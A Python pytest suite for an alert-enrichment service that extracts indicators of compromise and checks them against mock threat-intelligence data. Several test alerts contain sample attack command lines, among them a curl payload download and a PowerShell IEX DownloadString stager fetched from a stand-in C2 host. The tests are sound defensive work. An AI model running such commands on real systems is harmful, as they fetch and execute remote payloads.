"""
Phase 3.2 — IOC Extraction & Threat Intelligence Enrichment Test Suite
Tests the EnrichmentAgent, mock_intel tools, and the enrichment API endpoint.
"""
import pytest
from fastapi.testclient import TestClient
from app.main import app
from app.db.session import init_db
from app.agents.enrichment.enrichment_agent import EnrichmentAgent
from app.tools.mock_intel import (
    query_mock_ip_reputation,
    query_mock_hash_reputation,
    query_mock_domain_reputation,
    query_mock_url_reputation,
    KNOWN_MALICIOUS_IPS,
    KNOWN_MALICIOUS_HASHES,
    KNOWN_MALICIOUS_DOMAINS,
)

# Initialize DB and client
init_db()
client = TestClient(app)


# ============================================================
# SECTION 1: mock_intel.py Unit Tests
# ============================================================

class TestMockIPReputation:
    """Unit tests for query_mock_ip_reputation()"""

    def test_known_malicious_ip_is_malicious(self):
        """Explicitly listed IPs in KNOWN_MALICIOUS_IPS must return MALICIOUS."""
        for ip in KNOWN_MALICIOUS_IPS:
            result = query_mock_ip_reputation(ip)
            assert result["reputation"] == "MALICIOUS", f"Expected MALICIOUS for {ip}"
            assert result["confidence"] > 0.5
            assert result["is_malicious"] is True

    def test_private_ip_is_clean(self):
        """RFC1918 private IPs must be CLEAN."""
        for ip in ["192.168.1.1", "10.0.0.1", "172.16.5.99"]:
            result = query_mock_ip_reputation(ip)
            assert result["reputation"] == "CLEAN", f"Expected CLEAN for private IP {ip}"
            assert result["is_malicious"] is False

    def test_loopback_ip_is_clean(self):
        """Loopback address must be CLEAN."""
        result = query_mock_ip_reputation("127.0.0.1")
        assert result["reputation"] == "CLEAN"
        assert result["is_malicious"] is False

    def test_arbitrary_185_ip_is_not_malicious(self):
        """185.x.x.x IPs NOT in KNOWN_MALICIOUS_IPS must NOT be MALICIOUS."""
        result = query_mock_ip_reputation("185.1.2.3")
        assert result["reputation"] == "UNKNOWN", \
            "Non-listed 185.x.x.x IP must be UNKNOWN, not auto-malicious"
        assert result["is_malicious"] is False

    def test_arbitrary_198_51_ip_is_not_malicious(self):
        """198.51.x.x IPs NOT in KNOWN_MALICIOUS_IPS must NOT be MALICIOUS.
        Note: 198.51.50.x is used (not 198.51.100.x which is RFC 5737 TEST-NET-2
        reserved and legitimately returns CLEAN by ipaddress module)."""
        result = query_mock_ip_reputation("198.51.50.5")
        assert result["reputation"] != "MALICIOUS", \
            "Non-listed 198.51.x.x IP must not be auto-malicious due to prefix heuristic"
        assert result["is_malicious"] is False

    def test_unknown_public_ip_is_unknown(self):
        """Generic public IP not in any database must be UNKNOWN."""
        result = query_mock_ip_reputation("8.8.8.8")
        assert result["reputation"] == "UNKNOWN"
        assert result["is_malicious"] is False

    def test_result_contains_required_fields(self):
        """Result dict must contain all required fields."""
        result = query_mock_ip_reputation("192.168.0.1")
        for field in ["ip", "is_malicious", "reputation_score", "reputation", "confidence", "evidence", "source"]:
            assert field in result, f"Missing field: {field}"


class TestMockHashReputation:
    """Unit tests for query_mock_hash_reputation()"""

    def test_known_malicious_hash_sha256(self):
        """SHA256 hashes in KNOWN_MALICIOUS_HASHES must return MALICIOUS."""
        for h in KNOWN_MALICIOUS_HASHES:
            result = query_mock_hash_reputation(h)
            assert result["reputation"] == "MALICIOUS", f"Expected MALICIOUS for {h[:16]}..."
            assert result["confidence"] > 0.9

    def test_unknown_sha256_is_unknown(self):
        """An arbitrary valid SHA256 hash not in the database must be UNKNOWN."""
        unknown_hash = "a" * 64
        result = query_mock_hash_reputation(unknown_hash)
        assert result["reputation"] == "UNKNOWN"
        assert result["confidence"] == 0.0

    def test_unknown_md5_is_unknown(self):
        """An arbitrary valid MD5 hash not in the database must be UNKNOWN."""
        result = query_mock_hash_reputation("b" * 32)
        assert result["reputation"] == "UNKNOWN"

    def test_result_contains_required_fields(self):
        """Result dict must contain all required fields."""
        result = query_mock_hash_reputation("d" * 64)
        for field in ["hash", "detection_ratio", "threat_name", "reputation", "confidence", "evidence", "source"]:
            assert field in result, f"Missing field: {field}"


class TestMockDomainReputation:
    """Unit tests for query_mock_domain_reputation()"""

    def test_known_malicious_domain(self):
        for domain in KNOWN_MALICIOUS_DOMAINS:
            result = query_mock_domain_reputation(domain)
            assert result["reputation"] == "MALICIOUS"
            assert result["confidence"] > 0.5

    def test_unknown_domain_is_unknown(self):
        result = query_mock_domain_reputation("google.com")
        assert result["reputation"] == "UNKNOWN"
        assert result["confidence"] == 0.0

    def test_result_contains_required_fields(self):
        result = query_mock_domain_reputation("example.com")
        for field in ["domain", "reputation", "confidence", "evidence", "source"]:
            assert field in result


class TestMockURLReputation:
    """Unit tests for query_mock_url_reputation()"""

    def test_malicious_url_detected(self):
        result = query_mock_url_reputation("http://malicious-domain.net/payload.exe")
        assert result["reputation"] == "MALICIOUS"

    def test_unknown_url_is_unknown(self):
        result = query_mock_url_reputation("https://www.example.com/page")
        assert result["reputation"] == "UNKNOWN"

    def test_result_contains_required_fields(self):
        result = query_mock_url_reputation("https://example.com")
        for field in ["url", "reputation", "confidence", "evidence", "source"]:
            assert field in result


# ============================================================
# SECTION 2: EnrichmentAgent IOC Extraction Unit Tests
# ============================================================

class TestIOCExtraction:
    """Tests for EnrichmentAgent.extract_iocs()"""

    def setup_method(self):
        self.agent = EnrichmentAgent()

    def test_extracts_source_ip_structured(self):
        """Structured source_ip field must be extracted as IOC type IP."""
        alert = {"source_ip": "192.168.1.50", "alert_title": "Test Alert"}
        iocs = self.agent.extract_iocs(alert)
        ip_iocs = [i for i in iocs if i["type"] == "IP" and i["value"] == "192.168.1.50"]
        assert len(ip_iocs) == 1
        assert ip_iocs[0]["source"] == "source_ip"

    def test_extracts_destination_ip_structured(self):
        """Structured destination_ip field must be extracted."""
        alert = {"destination_ip": "10.0.0.1"}
        iocs = self.agent.extract_iocs(alert)
        assert any(i["value"] == "10.0.0.1" and i["type"] == "IP" for i in iocs)

    def test_extracts_sha256_from_file_hash(self):
        """Structured file_hash (SHA256) must be classified correctly."""
        sha256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        alert = {"file_hash": sha256}
        iocs = self.agent.extract_iocs(alert)
        assert any(i["value"] == sha256 and i["type"] == "SHA256" for i in iocs)

    def test_extracts_ipv4_from_command_line(self):
        """IPv4 addresses in command_line free text must be extracted."""
        alert = {"command_line": "curl http://185.220.101.5/payload.bin -o /tmp/x"}
        iocs = self.agent.extract_iocs(alert)
        ip_iocs = [i for i in iocs if i["type"] == "IP"]
        assert any(i["value"] == "185.220.101.5" for i in ip_iocs)

    def test_extracts_ipv6_from_free_text(self):
        """IPv6 addresses in free-text fields must be extracted as IOC type IP."""
        alert = {
            "description": "Connection attempt from 2001:db8::1 to internal host was blocked.",
            "alert_title": "IPv6 Intrusion Detection"
        }
        iocs = self.agent.extract_iocs(alert)
        ip_iocs = [i for i in iocs if i["type"] == "IP"]
        ipv6_found = any("2001" in i["value"] or "::" in i["value"] for i in ip_iocs)
        assert ipv6_found, f"Expected IPv6 IOC, found: {ip_iocs}"

    def test_extracts_url_from_free_text(self):
        """HTTP URLs in free text must be extracted as type URL."""
        alert = {"command_line": "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://bad-c2-server.com/stager.ps1')"}
        iocs = self.agent.extract_iocs(alert)
        url_iocs = [i for i in iocs if i["type"] == "URL"]
        assert len(url_iocs) >= 1

    def test_extracts_domain_from_free_text(self):
        """Domain names in free text must be extracted as type DOMAIN."""
        alert = {"description": "Outbound DNS to malicious-domain.net detected."}
        iocs = self.agent.extract_iocs(alert)
        domain_iocs = [i for i in iocs if i["type"] == "DOMAIN"]
        assert any("malicious-domain.net" in i["value"] for i in domain_iocs)

    def test_deduplication(self):
        """Same IOC in multiple fields must appear only once."""
        alert = {
            "source_ip": "192.168.1.50",
            "command_line": "connect 192.168.1.50 -p 443",
            "description": "Source 192.168.1.50 involved"
        }
        iocs = self.agent.extract_iocs(alert)
        ip_iocs = [i for i in iocs if i["type"] == "IP" and i["value"] == "192.168.1.50"]
        assert len(ip_iocs) == 1, "Duplicate IOC must be deduplicated"

    def test_no_ioc_alert_returns_empty(self):
        """Alert with no extractable IOCs must return empty list."""
        alert = {"alert_title": "Generic system info alert", "severity": "LOW"}
        iocs = self.agent.extract_iocs(alert)
        assert isinstance(iocs, list)
        assert len(iocs) == 0

    def test_file_extensions_not_extracted_as_domains(self):
        """File names like payload.exe must NOT be classified as DOMAIN IOCs."""
        alert = {"command_line": "cmd.exe /c run payload.bat config.json"}
        iocs = self.agent.extract_iocs(alert)
        domain_values = [i["value"] for i in iocs if i["type"] == "DOMAIN"]
        assert "payload.bat" not in domain_values
        assert "config.json" not in domain_values


# ============================================================
# SECTION 3: EnrichmentAgent.enrich_alert() Tests
# ============================================================

class TestEnrichAlert:
    """Tests for the full enrich_alert() pipeline."""

    def setup_method(self):
        self.agent = EnrichmentAgent()

    def test_enrich_alert_structure(self):
        """enrich_alert() must return a well-structured result dict."""
        alert = {
            "id": "TEST-ENR-001",
            "source_ip": "185.220.101.5",
            "destination_ip": "10.0.0.5",
            "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "alert_title": "Suspicious Encoded PowerShell Command Execution",
            "severity": "CRITICAL"
        }
        result = self.agent.enrich_alert(alert)

        assert result["agent"] == "Enrichment Agent"
        assert result["status"] == "completed"
        assert result["alert_id"] == "TEST-ENR-001"
        assert "timestamp" in result
        assert "total_iocs_extracted" in result
        assert "summary" in result
        assert "iocs" in result
        assert isinstance(result["iocs"], list)

    def test_malicious_ip_counted_in_summary(self):
        """Known malicious IP must increment malicious counter in summary."""
        alert = {"source_ip": "185.220.101.5", "alert_title": "C2 Connection Alert"}
        result = self.agent.enrich_alert(alert)
        assert result["summary"]["malicious"] >= 1, \
            "185.220.101.5 (listed in KNOWN_MALICIOUS_IPS) must be counted as malicious"

    def test_malicious_hash_counted(self):
        """Known malicious SHA256 must increment malicious counter."""
        sha256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        alert = {"file_hash": sha256, "alert_title": "Malware Detected"}
        result = self.agent.enrich_alert(alert)
        assert result["summary"]["malicious"] >= 1

    def test_private_ip_counted_as_clean(self):
        """Private IP must be counted as CLEAN in summary."""
        alert = {"source_ip": "192.168.100.5", "alert_title": "Internal Activity"}
        result = self.agent.enrich_alert(alert)
        assert result["summary"]["clean"] >= 1

    def test_ioc_result_has_required_fields(self):
        """Each enriched IOC in the result must have all required fields."""
        alert = {"source_ip": "10.0.0.1"}
        result = self.agent.enrich_alert(alert)
        for ioc in result["iocs"]:
            for field in ["value", "type", "source", "reputation", "confidence", "evidence", "provider"]:
                assert field in ioc, f"IOC missing field: {field}"

    def test_total_iocs_extracted_matches_iocs_list(self):
        """total_iocs_extracted must match the length of the iocs list."""
        alert = {
            "source_ip": "192.168.1.1",
            "destination_ip": "185.220.101.5",
            "alert_title": "Test alert"
        }
        result = self.agent.enrich_alert(alert)
        assert result["total_iocs_extracted"] == len(result["iocs"])

    def test_enrich_alert_with_empty_alert(self):
        """enrich_alert() with an empty alert must return zero IOCs, not raise."""
        result = self.agent.enrich_alert({})
        assert result["status"] == "completed"
        assert result["total_iocs_extracted"] == 0
        assert result["iocs"] == []


# ============================================================
# SECTION 4: Backward Compatibility — enrich_iocs()
# ============================================================

class TestEnrichIOCsBackwardCompatibility:
    """Tests ensuring the original enrich_iocs() interface still works."""

    def setup_method(self):
        self.agent = EnrichmentAgent()

    def test_enrich_iocs_returns_completed(self):
        """enrich_iocs() must return status=completed."""
        result = self.agent.enrich_iocs([{"type": "IP", "value": "185.220.101.5"}])
        assert result["status"] == "completed"
        assert result["agent"] == "Enrichment Agent"

    def test_enrich_iocs_counts_results(self):
        """enriched_iocs_count must match input list length."""
        iocs = [
            {"type": "IP", "value": "192.168.1.1"},
            {"type": "SHA256", "value": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
        ]
        result = self.agent.enrich_iocs(iocs)
        assert result["enriched_iocs_count"] == 2

    def test_enrich_iocs_has_threat_intel_summary(self):
        """threat_intel_summary field must be present."""
        result = self.agent.enrich_iocs([{"type": "DOMAIN", "value": "malicious-domain.net"}])
        assert "threat_intel_summary" in result
        assert isinstance(result["threat_intel_summary"], str)

    def test_enrich_iocs_results_list(self):
        """results field must be a list with one entry per valid IOC."""
        result = self.agent.enrich_iocs([
            {"type": "IP", "value": "10.0.0.5"},
        ])
        assert "results" in result
        assert isinstance(result["results"], list)
        assert len(result["results"]) == 1

    def test_enrich_iocs_empty_input(self):
        """enrich_iocs() with empty list must return zero results."""
        result = self.agent.enrich_iocs([])
        assert result["enriched_iocs_count"] == 0
        assert result["results"] == []


# ============================================================
# SECTION 5: Phase 3.2 API Endpoint Integration Tests
# ============================================================

class TestEnrichmentAPIEndpoint:
    """Integration tests for POST /api/v1/alerts/{alert_id}/enrich"""

    def test_enrich_alert_api_success(self):
        """POST /api/v1/alerts/{id}/enrich must return 200 with enrichment_result."""
        # Ingest a test alert with known IOCs
        payload = {
            "alert_title": "Phase 3.2 Enrichment Integration Test Alert",
            "source": "CrowdStrike EDR",
            "severity": "HIGH",
            "source_ip": "185.220.101.5",
            "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "command_line": "powershell.exe -ExecutionPolicy Bypass"
        }
        ingest_res = client.post("/api/v1/alerts", json=payload)
        assert ingest_res.status_code == 201
        alert_id = ingest_res.json()["id"]

        # Call enrichment endpoint
        enrich_res = client.post(f"/api/v1/alerts/{alert_id}/enrich")
        assert enrich_res.status_code == 200
        data = enrich_res.json()

        # Validate response structure
        assert "alert" in data
        assert "enrichment_result" in data
        assert data["alert"]["status"] == "ENRICHED"
        assert data["enrichment_result"]["status"] == "completed"
        assert data["enrichment_result"]["agent"] == "Enrichment Agent"
        assert data["enrichment_result"]["alert_id"] == alert_id

    def test_enrich_alert_extracts_malicious_ioc(self):
        """Enrichment of alert with known malicious IP must flag at least one MALICIOUS IOC."""
        payload = {
            "alert_title": "C2 Communication Test",
            "source": "Splunk SIEM",
            "severity": "CRITICAL",
            "source_ip": "185.220.101.5"
        }
        ingest_res = client.post("/api/v1/alerts", json=payload)
        alert_id = ingest_res.json()["id"]

        enrich_res = client.post(f"/api/v1/alerts/{alert_id}/enrich")
        data = enrich_res.json()
        result = data["enrichment_result"]

        assert result["summary"]["malicious"] >= 1, \
            "Enrichment must detect 185.220.101.5 as MALICIOUS"

    def test_enrich_alert_persists_to_normalized_data(self):
        """After enrichment, normalized_data must contain 'enrichment' key."""
        payload = {
            "alert_title": "Persistence Check Enrichment Test",
            "source": "Azure Sentinel",
            "severity": "MEDIUM",
            "source_ip": "10.0.0.1"
        }
        ingest_res = client.post("/api/v1/alerts", json=payload)
        alert_id = ingest_res.json()["id"]

        client.post(f"/api/v1/alerts/{alert_id}/enrich")

        # Re-fetch and verify persistence
        get_res = client.get(f"/api/v1/alerts/{alert_id}")
        assert get_res.status_code == 200
        assert get_res.json()["status"] == "ENRICHED"
        assert "enrichment" in get_res.json()["normalized_data"]

    def test_enrich_alert_404_for_unknown_alert(self):
        """POST /api/v1/alerts/UNKNOWN-ID/enrich must return 404."""
        res = client.post("/api/v1/alerts/NON-EXISTENT-ENRICH-999/enrich")
        assert res.status_code == 404
        assert "not found" in res.json()["detail"].lower()

    def test_enrich_alert_with_no_iocs(self):
        """Alert with no IOC fields must return enrichment with 0 IOCs, not error."""
        payload = {
            "alert_title": "Generic Info Alert With No IOCs",
            "source": "Manual Entry",
            "severity": "INFO"
        }
        ingest_res = client.post("/api/v1/alerts", json=payload)
        alert_id = ingest_res.json()["id"]

        enrich_res = client.post(f"/api/v1/alerts/{alert_id}/enrich")
        assert enrich_res.status_code == 200
        result = enrich_res.json()["enrichment_result"]
        assert result["total_iocs_extracted"] == 0
        assert result["status"] == "completed"
